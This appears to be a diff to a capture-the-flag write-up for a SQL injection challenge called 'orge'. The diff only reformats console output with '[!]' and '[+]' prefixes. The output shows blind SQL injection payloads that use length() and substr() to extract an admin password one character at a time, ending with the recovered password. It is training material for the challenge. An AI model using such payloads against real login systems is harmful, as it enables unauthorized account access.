@@ -58,26 +58,26 @@ print(f"Final payload: ?pw={password}")
 ```
 $ python .\orge_script.py
 
-Payload: ?pw=' || id='admin' && length(pw)=8 -- -
-Password length: 8
+[!] Payload: ?pw=' || id='admin' && length(pw)=8 -- -
+[!] Password length: 8
 
-Payload: ?pw=' || id='admin' && substr(pw, 1, 1)='7' -- -
-Character at index 1: 7
-Payload: ?pw=' || id='admin' && substr(pw, 2, 1)='b' -- -
-Character at index 2: b
-Payload: ?pw=' || id='admin' && substr(pw, 3, 1)='7' -- -
-Character at index 3: 7
-Payload: ?pw=' || id='admin' && substr(pw, 4, 1)='5' -- -
-Character at index 4: 5
-Payload: ?pw=' || id='admin' && substr(pw, 5, 1)='1' -- -
-Character at index 5: 1
-Payload: ?pw=' || id='admin' && substr(pw, 6, 1)='a' -- -
-Character at index 6: a
-Payload: ?pw=' || id='admin' && substr(pw, 7, 1)='e' -- -
-Character at index 7: e
-Payload: ?pw=' || id='admin' && substr(pw, 8, 1)='c' -- -
-Character at index 8: c     
+[+] Payload: ?pw=' || id='admin' && substr(pw, 1, 1)='7' -- -
+[+] Character at index 1: 7
+[+] Payload: ?pw=' || id='admin' && substr(pw, 2, 1)='b' -- -
+[+] Character at index 2: b
+[+] Payload: ?pw=' || id='admin' && substr(pw, 3, 1)='7' -- -
+[+] Character at index 3: 7
+[+] Payload: ?pw=' || id='admin' && substr(pw, 4, 1)='5' -- -
+[+] Character at index 4: 5
+[+] Payload: ?pw=' || id='admin' && substr(pw, 5, 1)='1' -- -
+[+] Character at index 5: 1
+[+] Payload: ?pw=' || id='admin' && substr(pw, 6, 1)='a' -- -
+[+] Character at index 6: a
+[+] Payload: ?pw=' || id='admin' && substr(pw, 7, 1)='e' -- -
+[+] Character at index 7: e
+[+] Payload: ?pw=' || id='admin' && substr(pw, 8, 1)='c' -- -
+[+] Character at index 8: c     
 
-Extracted password: 7b751aec
-Final payload: ?pw=7b751aec 
+[!] Extracted Password: 7b751aec
+[!] Final payload: ?pw=7b751aec 
 ```
